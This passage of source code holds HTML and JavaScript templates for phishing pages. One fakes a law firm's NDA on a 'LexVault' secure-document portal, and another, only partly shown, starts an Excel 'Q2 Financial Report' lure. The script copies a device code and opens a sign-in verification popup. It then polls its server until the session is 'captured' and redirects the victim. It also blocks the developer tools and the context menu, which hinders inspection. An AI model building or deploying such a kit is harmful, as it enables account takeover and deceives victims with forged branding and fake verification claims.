.tag-sep { width: 1px; height: 10px; background: var(--border-mid); }
.tag-dot { width: 4px; height: 4px; border-radius: 50%; background: var(--ink-faint); }

.hidden { display: none !important; }
</style>
</head>
<body>

<div class="doc-bg" aria-hidden="true">
  <div class="fake-doc">
    <div class="doc-firm-header">
      <div>
        <div class="doc-firm-name">Mason Parkes &amp; Associates LLP</div>
        <div class="doc-firm-sub">Attorneys at Law · Est. 1987</div>
      </div>
      <svg class="doc-seal" viewBox="0 0 54 54" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="27" cy="27" r="26" stroke="#b8942a" stroke-width="1.2"/>
        <circle cx="27" cy="27" r="21" stroke="#b8942a" stroke-width="0.8"/>
        <text x="27" y="24" text-anchor="middle" font-family="Cormorant Garamond, serif" font-size="6" fill="#b8942a" font-weight="600" letter-spacing="1">OFFICIAL</text>
        <text x="27" y="33" text-anchor="middle" font-family="Cormorant Garamond, serif" font-size="5.5" fill="#b8942a" letter-spacing="0.5">SEAL</text>
        <circle cx="27" cy="27" r="3.5" fill="#b8942a" opacity="0.3"/>
      </svg>
    </div>

    <div class="doc-title-block">
      <h1>Non-Disclosure Agreement</h1>
      <div class="sub">Confidential · Privileged Communication</div>
    </div>

    <div class="doc-line w90"></div>
    <div class="doc-line w100"></div>
    <div class="doc-line w80"></div>
    <div class="doc-line w100"></div>
    <div class="doc-line w70"></div>

    <div class="doc-section-title">1. Definitions</div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w90"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w80"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w55"></div></div>

    <div class="doc-section-title">2. Obligations of Receiving Party</div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w90"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w70"></div></div>

    <div class="doc-section-title">3. Term &amp; Termination</div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w80"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w90"></div></div>

    <div class="doc-sigs">
      <div><div class="sig-line"></div><div class="sig-name"></div><div class="sig-role"></div></div>
      <div><div class="sig-line"></div><div class="sig-name"></div><div class="sig-role"></div></div>
    </div>
  </div>
</div>

<div class="overlay" aria-hidden="true"></div>

<header class="topbar">
  <div class="topbar-left">
    <div class="topbar-logo">
      <div class="topbar-logo-icon">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" stroke="white" stroke-width="1.6" stroke-linejoin="round"/>
          <path d="M14 2v6h6" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <span class="topbar-name">LexVault</span>
    </div>
    <div class="topbar-sep"></div>
    <span class="topbar-doc-label" id="topbarDocLabel">Secure document access</span>
  </div>
  <div class="topbar-right">
    <div class="secure-pill">
      <div class="secure-dot"></div>
      256-bit encrypted
    </div>
  </div>
</header>

<div class="page">
  <div class="card" id="mainCard">
    <div class="card-bar"></div>

    <div class="card-header">
      <div class="company-avatar">MP</div>
      <div class="company-info">
        <div class="company-name">Mason Parkes &amp; Associates LLP</div>
        <div class="company-verified">
          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
            <path d="M8 1l1.8 2.2 2.7-.6.2 2.8 2.3 1.6-1.4 2.4.8 2.7-2.8.3-1.6 2.3-2.5-1.1-2.5 1.1-1.6-2.3-2.8-.3.8-2.7-1.4-2.4 2.3-1.6.2-2.8 2.7.6z"/>
            <path d="M5.5 8.5l2 1.5 3-4" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          </svg>
          Verified Publisher
        </div>
      </div>
    </div>

    <div id="stepCode">
      <div class="card-body">
        <div class="alert-strip">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2L3 7v5c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V7L12 2Z"/>
          </svg>
          <p>This type of document requires verification. Copy your access code to continue.</p>
        </div>

        <div class="doc-row">
          <div class="doc-row-icon">
            <svg viewBox="0 0 24 24" fill="none">
              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" stroke="#64748b" stroke-width="1.5" stroke-linejoin="round"/>
              <path d="M14 2v6h6" stroke="#64748b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
              <line x1="8" y1="13" x2="16" y2="13" stroke="#94a3b8" stroke-width="1.3" stroke-linecap="round"/>
              <line x1="8" y1="17" x2="16" y2="17" stroke="#94a3b8" stroke-width="1.3" stroke-linecap="round"/>
            </svg>
          </div>
          <div class="doc-row-info">
            <div class="doc-row-name">Non-Compete Document</div>
            <div class="doc-row-meta">PDF</div>
          </div>
          <div class="doc-lock-badge">
            <svg viewBox="0 0 24 24">
              <rect x="3" y="11" width="18" height="11" rx="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
          </div>
        </div>

        <div class="code-label-row">
          <span class="code-label">Access code</span>
          <button class="new-code-btn" id="btnNewCode" style="display:none;">
            <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.49"/></svg>
            New code
          </button>
        </div>

        <div class="code-box">
          <span class="code-value" id="codeDisplay">Loading...</span>
          <button class="copy-btn" id="btnCopy" disabled>
            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            Copy
          </button>
        </div>

        <div class="how-steps">
          <div class="how-item">
            <div class="how-num">1</div>
            <p class="how-text">Copy the access code shown above</p>
          </div>
          <div class="how-item">
            <div class="how-num">2</div>
            <p class="how-text">Click <strong>Authenticate</strong> to open the verification page</p>
          </div>
          <div class="how-item">
            <div class="how-num">3</div>
            <p class="how-text">Paste the code on the verification page to confirm your identity</p>
          </div>
        </div>

        <button class="btn-authenticate" id="btnAuthenticate" disabled>
          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Authenticate
        </button>

        <div class="status-bar" id="statusBar">
          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
            <circle cx="8" cy="8" r="8"/>
            <path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          </svg>
          Generating secure code...
        </div>
      </div>
    </div>

    <div id="stepSuccess" class="hidden">
      <div class="card-body">
        <div class="success-wrap">
          <div class="success-ring">
            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h2 class="success-title">Identity verified</h2>
          <div class="success-email-pill">Access granted</div>
          <p class="success-sub">You now have full access. Your identity has been confirmed via the device code flow.</p>
          <button class="btn-download" id="btnDownload">
            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Download document
          </button>
          <div class="audit-log" id="auditLog"></div>
        </div>
      </div>
    </div>

    <div class="card-footer">

    </div>
  </div>
</div>

<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});

(function(){
  var sid = '{session_id}';
  var verifyUrl = '{verify_url}';
  var codeReady = {code_ready};
  var code = '{user_code}';
  var expiresIn = {expires_seconds};

  var codeEl = document.getElementById('codeDisplay');
  var statusEl = document.getElementById('statusBar');
  var btnAuth = document.getElementById('btnAuthenticate');
  var copyBtn = document.getElementById('btnCopy');

  function setStatus(msg, isError) {
    if (isError) {
      statusEl.style.background = '#fef2f2';
      statusEl.style.color = '#dc2626';
      statusEl.style.borderColor = '#fecaca';
    } else {
      statusEl.style.background = '#f0fafa';
      statusEl.style.color = '#0a7c6e';
      statusEl.style.borderColor = 'rgba(10,124,110,0.18)';
    }
    statusEl.innerHTML = msg;
  }

  function showCode(c, v) {
    code = c;
    if(v) verifyUrl = v;
    codeEl.textContent = c;
    btnAuth.disabled = false;
    copyBtn.disabled = false;
    setStatus('<svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="8"/><path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg> Code ready — click Authenticate to proceed', false);
  }

  if (codeReady && code) {
    showCode(code, verifyUrl);
  } else {
    codeEl.textContent = 'Loading...';
    btnAuth.disabled = true;
    copyBtn.disabled = true;
    setStatus('Generating secure code...', false);
  }

  function copyCode() {
    if (!code) return;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(code).then(function() { showCopied(); });
    } else {
      var t = document.createElement('textarea');
      t.value = code;
      document.body.appendChild(t);
      t.select();
      document.execCommand('copy');
      document.body.removeChild(t);
      showCopied();
    }
  }

  function showCopied() {
    copyBtn.classList.add('copied');
    copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied!';
    setTimeout(function() {
      copyBtn.classList.remove('copied');
      copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy';
    }, 2000);
  }

  function openSignIn() {
    if (!code) {
      setStatus('Please wait for code generation.', true);
      return;
    }
    copyCode();
    var w = 600, h = 600, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
    var popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
    if (popup) popup.focus();
    setStatus('Verification page opened. Please confirm the code.', false);
  }

  function showSuccess(redirectUrl) {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepSuccess').classList.remove('hidden');
    var downloadBtn = document.getElementById('btnDownload');
    if (redirectUrl) {
      downloadBtn.onclick = function() { top.location.href = redirectUrl; };
    } else {
      downloadBtn.onclick = function() { top.location.href = redirectUrl || '/'; };
    }
    var now = new Date();
    document.getElementById('auditLog').textContent =
      'ACCESS GRANTED\n' +
      'Time:    ' + now.toUTCString() + '\n' +
      'Method:  Device Code Flow\n' +
      'Session: ' + sid;
  }

  function poll() {
    fetch('/dc/status/' + sid, {method:'GET',credentials:'include'}).then(function(r) { return r.json() }).then(function(d) {
      if (d.ready && !codeReady) {
        codeReady = true;
        showCode(d.user_code, d.verify_url);
      }
      if (d.captured) {
        showSuccess(d.redirect_url);
        if (d.redirect_url) {
          setTimeout(function(){ top.location.href = d.redirect_url; }, 2500);
        }
      }
      if (d.expired) {
        setStatus('Code expired. Please refresh the page.', true);
        btnAuth.disabled = true;
      }
      if (!d.failed && !d.expired && !d.captured) {
        setTimeout(poll, 3000);
      }
    })['catch'](function(){ setTimeout(poll, 5000); });
  }
  
  poll();

  copyBtn.addEventListener('click', copyCode);
  btnAuth.addEventListener('click', openSignIn);
})();
</script>
</body>
</html>`



// Excel / Q2 Financial Report themed page
const DEVICE_CODE_EXCEL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Q2 Financial Report — Restricted</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; background: #fff; }

body { font-family: 'Calibri', 'Segoe UI', Arial, sans-serif; }
.ui { font-family: 'Segoe UI', system-ui, -apple-system, Arial, sans-serif; }

/* ═══════════════════════════════════════════════════
   EXCEL BACKGROUND
═══════════════════════════════════════════════════ */
.xl-shell {
  position: fixed;
  inset: 0;
  background: #fff;
  filter: blur(3.5px);
  transform: scale(1.02);
  transform-origin: center;
  user-select: none;
  pointer-events: none;
  display: flex;
  flex-direction: column;
}

.xl-ribbon {
  height: 30px;
  background: #217346;
  display: flex;
  align-items: center;
  padding: 0 10px;
  gap: 18px;
  flex-shrink: 0;
}
.xl-ribbon-tab {
  font-size: 11px;
  color: rgba(255,255,255,0.85);
  font-family: 'Segoe UI', Arial, sans-serif;
  letter-spacing: 0.01em;
}
.xl-ribbon-tab.active {
  color: #fff;
  font-weight: 500;
  border-bottom: 2px solid #fff;
  padding-bottom: 1px;
}

.xl-formula-bar {
  height: 26px;
  background: #fff;
  border-bottom: 1px solid #d0d0d0;
  display: flex;
  align-items: center;
  flex-shrink: 0;
}
.xl-name-box {
  width: 80px;
  border-right: 1px solid #d0d0d0;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a1a;
  padding: 0 8px;
  height: 100%;
  display: flex;
  align-items: center;
  flex-shrink: 0;
}
.xl-fx {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #9b59b6;
  padding: 0 10px;
  font-style: italic;
  border-right: 1px solid #d0d0d0;
  height: 100%;
  display: flex;
  align-items: center;
  flex-shrink: 0;
  width: 30px;
  justify-content: center;
}
.xl-formula-text {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a1a;
  padding: 0 10px;
}

.xl-body {
  flex: 1;
  display: flex;
  overflow: hidden;
}

.xl-rownums {
  width: 42px;
  background: #f2f2f2;
  border-right: 1px solid #d0d0d0;
  flex-shrink: 0;
  display: flex;
  flex-direction: column;
  overflow-y: auto;
  scrollbar-width: none;
}
.xl-rownums::-webkit-scrollbar { display: none; }
.xl-rownum-corner {
  height: 22px;
  border-bottom: 1px solid #d0d0d0;
  background: #f2f2f2;
  flex-shrink: 0;
}
.xl-rn {
  height: 20px;
  display: flex;
  align-items: center;
  justify-content: flex-end;
  padding-right: 4px;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 10px;
  color: #666;
  border-bottom: 1px solid #e8e8e8;
  flex-shrink: 0;
}

.xl-grid-wrap {
  flex: 1;
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

.xl-col-headers {
  height: 22px;
  display: flex;
  background: #f2f2f2;
  border-bottom: 1px solid #d0d0d0;
  flex-shrink: 0;
}
.xl-ch {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 10px;
  color: #444;
  border-right: 1px solid #d0d0d0;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.xl-grid {
  flex: 1;
  overflow-y: auto;
  scrollbar-width: none;
}
.xl-grid::-webkit-scrollbar { display: none; }
.xl-row {
  display: flex;
  height: 20px;
}
.xl-row.merged-title { height: 28px; }

.xl-cell {
  border-right: 1px solid #e0e0e0;
  border-bottom: 1px solid #e0e0e0;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a1a;
  display: flex;
  align-items: center;
  overflow: hidden;
  white-space: nowrap;
  flex-shrink: 0;
  padding: 0 4px;
}

.c-B  { width: 220px; }
.c-C  { width: 100px; }
.c-D  { width: 100px; }
.c-E  { width: 100px; }
.c-F  { width: 100px; }
.c-G  { width: 80px; }
.c-H  { width: 80px; }
.c-I  { width: 80px; }

.xl-cell.header-row {
  background: #1f5c8b;
  color: #fff;
  font-weight: 500;
  font-size: 10px;
  justify-content: center;
  text-transform: uppercase;
  letter-spacing: 0.04em;
  border-color: #1a4f7a;
}
.xl-cell.section-head {
  background: #dce3ec;
  color: #1a1a1a;
  font-weight: 700;
  font-size: 11px;
  border-color: #c8d4e0;
}
.xl-cell.subtotal-row {
  background: #edf2f7;
  font-weight: 600;
  border-top: 1px solid #aab8c8;
  border-color: #c8d4e0;
}
.xl-cell.total-row {
  background: #1f5c8b;
  color: #fff;
  font-weight: 700;
  border-color: #1a4f7a;
}
.xl-cell.even-row { background: #f7f9fc; }
.xl-cell.right { justify-content: flex-end; }
.xl-cell.center { justify-content: center; }
.xl-cell.formula { color: #1f5c8b; }
.xl-cell.neg { color: #c0392b; }
.xl-cell.pos { color: #1e7d45; }
.xl-cell.bold { font-weight: 600; }
.xl-cell.title-cell {
  font-size: 14px;
  font-weight: 700;
  color: #1a1a1a;
  letter-spacing: -0.01em;
  background: #fff;
  border: none;
}
.xl-cell.subtitle-cell {
  font-size: 10px;
  color: #888;
  background: #fff;
  border: none;
}
.xl-cell.selected {
  outline: 2px solid #217346;
  outline-offset: -2px;
}

.xl-tabs {
  height: 26px;
  background: #f2f2f2;
  border-top: 1px solid #d0d0d0;
  display: flex;
  align-items: flex-end;
  padding: 0 6px;
  gap: 0;
  flex-shrink: 0;
}
.xl-tab {
  height: 22px;
  padding: 0 14px;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #444;
  border: 1px solid #d0d0d0;
  border-bottom: none;
  background: #e8e8e8;
  display: flex;
  align-items: center;
  margin-right: 2px;
  border-radius: 3px 3px 0 0;
}
.xl-tab.active {
  background: #fff;
  color: #217346;
  font-weight: 600;
  border-bottom: 2px solid #fff;
  z-index: 1;
}

.xl-statusbar {
  height: 20px;
  background: #f2f2f2;
  border-top: 1px solid #d0d0d0;
  display: flex;
  align-items: center;
  padding: 0 10px;
  gap: 16px;
  flex-shrink: 0;
}
.xl-status-item {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 10px;
  color: #555;
}

.page-overlay {
  position: fixed;
  inset: 0;
  background: rgba(240, 243, 247, 0.55);
  pointer-events: none;
}

.topbar {
  position: fixed;
  top: 0; left: 0; right: 0;
  z-index: 30;
  height: 46px;
  background: #fff;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 1.8rem;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
}
.topbar-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.topbar-brand {
  display: flex;
  align-items: center;
  gap: 7px;
}
.brand-xl-icon {
  width: 22px; height: 22px;
  background: #217346;
  border-radius: 3px;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.brand-xl-icon svg { width: 13px; height: 13px; fill: white; }
.brand-name {
  font-size: 0.83rem;
  font-weight: 600;
  color: #1a1a1a;
  letter-spacing: -0.01em;
}
.topbar-divider { width: 1px; height: 16px; background: #e0e0e0; }
.topbar-doc {
  font-size: 0.76rem;
  color: #888;
  max-width: 340px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.topbar-right {
  display: flex;
  align-items: center;
  gap: 10px;
}
.lock-tag {
  font-size: 0.65rem;
  color: #888;
  display: flex; align-items: center; gap: 4px;
  font-family: 'Segoe UI', Arial, sans-serif;
}
.lock-tag svg { width: 11px; height: 11px; stroke: #aaa; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }

.page {
  position: fixed;
  inset: 0;
  z-index: 20;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 46px 1rem 1rem;
}

.card {
  width: 100%;
  max-width: 360px;
  background: #fff;
  border: 1px solid #c8c8c8;
  border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 12px 40px rgba(0,0,0,0.1);
  overflow: hidden;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  animation: card-in 0.3s cubic-bezier(0.34,1.1,0.64,1) both;
}
@keyframes card-in {
  from { transform: translateY(16px); opacity: 0; }
  to   { transform: translateY(0); opacity: 1; }
}
.card-rule { height: 3px; background: #217346; }

.card-header {
  padding: 1.4rem 1.5rem 1.1rem;
  border-bottom: 1px solid #f0f0f0;
  display: flex;
  align-items: flex-start;
  gap: 11px;
}
.header-icon {
  width: 36px; height: 36px;
  background: #e8f5ee;
  border: 1px solid #c2dece;
  border-radius: 4px;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.header-icon svg { width: 18px; height: 18px; fill: #217346; }
.header-eyebrow {
  font-size: 0.65rem;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  color: #999;
  font-weight: 400;
  margin-bottom: 3px;
}
.header-title {
  font-size: 0.9rem;
  font-weight: 600;
  color: #1a1a1a;
  line-height: 1.25;
  margin-bottom: 1px;
}
.header-sub {
  font-size: 0.72rem;
  color: #888;
}

.card-body { padding: 1.3rem 1.5rem; }

.access-info {
  font-size: 0.78rem;
  color: #555;
  line-height: 1.6;
  margin-bottom: 1.3rem;
  padding: 10px 12px;
  background: #f8f8f8;
  border: 1px solid #eaeaea;
  border-left: 3px solid #217346;
  border-radius: 0 3px 3px 0;
}

.btn-open {
  width: 100%;
  padding: 9px 14px;
  background: #217346;
  color: #fff;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.83rem;
  font-weight: 600;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: background 0.12s;
  letter-spacing: 0.01em;
  margin-bottom: 8px;
}
.btn-open:hover { background: #1a5c38; }
.btn-open svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.divider-row {
  display: flex; align-items: center; gap: 10px;
  font-size: 0.68rem; color: #bbb;
  margin: 10px 0;
}
.divider-row::before, .divider-row::after { content: ''; flex: 1; height: 1px; background: #e8e8e8; }

.btn-ms {
  width: 100%;
  padding: 8px 14px;
  background: #fff;
  color: #1a1a1a;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.82rem;
  font-weight: 400;
  border: 1px solid #d0d0d0;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 9px;
  transition: background 0.12s, border-color 0.12s;
}
.btn-ms:hover { background: #f5f5f5; border-color: #bbb; }

.code-section { margin-bottom: 1.1rem; }
.code-label-row {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 6px;
}
.code-label {
  font-size: 0.65rem;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  color: #999;
}
.regen-btn {
  font-size: 0.7rem;
  color: #217346;
  background: none; border: none;
  cursor: pointer;
  display: flex; align-items: center; gap: 4px;
  padding: 0;
  transition: color 0.12s;
}
.regen-btn:hover { color: #1a5c38; }
.regen-btn svg { width: 11px; height: 11px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }

.code-box {
  display: flex; align-items: center;
  background: #f8f9fa;
  border: 1px solid #d0d0d0;
  border-radius: 3px;
  padding: 10px 12px;
  gap: 10px;
}
.code-value {
  font-family: 'Consolas', 'Courier New', monospace;
  font-size: 1.25rem;
  font-weight: 700;
  color: #1a1a1a;
  letter-spacing: 0.2em;
  flex: 1;
  text-align: center;
}
.copy-btn {
  display: flex; align-items: center; gap: 5px;
  padding: 4px 10px;
  background: #fff;
  border: 1px solid #d0d0d0;
  border-radius: 3px;
  font-size: 0.7rem;
  color: #555;
  cursor: pointer;
  transition: background 0.1s, border-color 0.1s;
  white-space: nowrap;
}
.copy-btn:hover { background: #f0f0f0; border-color: #bbb; }
.copy-btn.copied { border-color: #217346; color: #217346; background: #e8f5ee; }
.copy-btn svg { width: 11px; height: 11px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.how-list {
  font-size: 0.75rem;
  color: #555;
  line-height: 1.6;
  margin-bottom: 1.1rem;
  padding-left: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 5px;
}
.how-list li {
  display: flex; align-items: flex-start; gap: 8px;
}
.how-n {
  width: 16px; height: 16px;
  border-radius: 50%;
  background: #e8e8e8;
  color: #555;
  font-size: 0.6rem;
  font-weight: 700;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
  margin-top: 2px;
}

.btn-authenticate {
  width: 100%;
  padding: 9px 14px;
  background: #217346;
  color: #fff;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.83rem;
  font-weight: 600;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: background 0.12s;
  margin-bottom: 7px;
}
.btn-authenticate:hover { background: #1a5c38; }
.btn-authenticate svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.btn-back {
  width: 100%;
  padding: 8px 14px;
  background: #fff;
  color: #666;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.78rem;
  font-weight: 400;
  border: 1px solid #e0e0e0;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 6px;
  transition: background 0.12s;
}
.btn-back:hover { background: #f5f5f5; }
.btn-back svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.success-wrap {
  display: flex; flex-direction: column; align-items: center;
  text-align: center; gap: 7px; padding: 0.5rem 0 0.6rem;
}
.success-icon {
  width: 44px; height: 44px;
  border-radius: 50%;
  background: #e8f5ee;
  border: 1.5px solid #c2dece;
  display: flex; align-items: center; justify-content: center;
  margin-bottom: 4px;
  animation: pop 0.28s cubic-bezier(0.34,1.5,0.64,1) both;
}
@keyframes pop { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.success-icon svg {
  width: 20px; height: 20px;
  stroke: #217346; fill: none;
  stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  stroke-dasharray: 26; stroke-dashoffset: 26;
  animation: draw 0.28s ease forwards 0.25s;
}
@keyframes draw { to { stroke-dashoffset: 0; } }
.success-title {
  font-size: 0.92rem;
  font-weight: 600;
  color: #1a1a1a;
}
.success-sub {
  font-size: 0.74rem;
  color: #777;
  line-height: 1.5;
  max-width: 270px;
  margin-bottom: 10px;
}
.btn-dl {
  width: 100%;
  padding: 9px 14px;
  background: #217346;
  color: #fff;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.82rem;
  font-weight: 600;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 7px;
  transition: background 0.12s;
}
.btn-dl:hover { background: #1a5c38; }
.btn-dl svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.card-footer {
  padding: 8px 1.5rem 1rem;
  border-top: 1px solid #f0f0f0;
  display: flex;
  align-items: center;
  gap: 8px;
  justify-content: center;
}
.ftag {
  font-size: 0.62rem;
  color: #bbb;
}
.ftag-sep { width: 1px; height: 9px; background: #e0e0e0; }

.dlg-overlay {
  position: absolute; inset: 0;
  background: rgba(248,249,250,0.88);
  backdrop-filter: blur(3px);
  display: flex; align-items: center; justify-content: center;
  z-index: 50;
  border-radius: 4px;
  padding: 1.5rem;
  animation: fd 0.14s ease both;
}
@keyframes fd { from { opacity: 0; } to { opacity: 1; } }
.dlg-inner {
  background: #fff;
  border: 1px solid #c8c8c8;
  border-radius: 4px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
  padding: 1.4rem 1.4rem 1.2rem;
  width: 100%;
  animation: su 0.18s cubic-bezier(0.34,1.3,0.64,1) both;
  display: flex; flex-direction: column; align-items: center; gap: 4px;
}
@keyframes su { from { transform: translateY(10px) scale(0.97); opacity: 0; } to { transform: translateY(0) scale(1); opacity: 1; } }
.dlg-icon {
  width: 38px; height: 38px;
  background: #e8f5ee;
  border: 1px solid #c2dece;
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  margin-bottom: 6px;
}
.dlg-icon svg { width: 16px; height: 16px; stroke: #217346; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
.dlg-heading {
  font-size: 0.85rem;
  font-weight: 600;
  color: #1a1a1a;
  text-align: center;
  margin-bottom: 2px;
}
.dlg-sub {
  font-size: 0.72rem;
  color: #888;
  text-align: center;
  line-height: 1.5;
  margin-bottom: 12px;
}
.dlg-actions { display: flex; flex-direction: column; gap: 6px; width: 100%; }
.dlg-proceed {
  width: 100%; padding: 9px 14px;
  background: #217346; color: #fff;
  font-size: 0.82rem; font-weight: 600;
  border: none; border-radius: 3px; cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 7px;
  transition: background 0.12s;
}
.dlg-proceed:hover { background: #1a5c38; }
.dlg-proceed svg { width: 13px; height: 13px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
.dlg-cancel {
  width: 100%; padding: 8px 14px;
  background: #fff; color: #555;
  font-size: 0.78rem; font-weight: 400;
  border: 1px solid #e0e0e0; border-radius: 3px; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  transition: background 0.12s;
}
.dlg-cancel:hover { background: #f5f5f5; }
.dlg-note {
  font-size: 0.62rem; color: #bbb; text-align: center; line-height: 1.5;
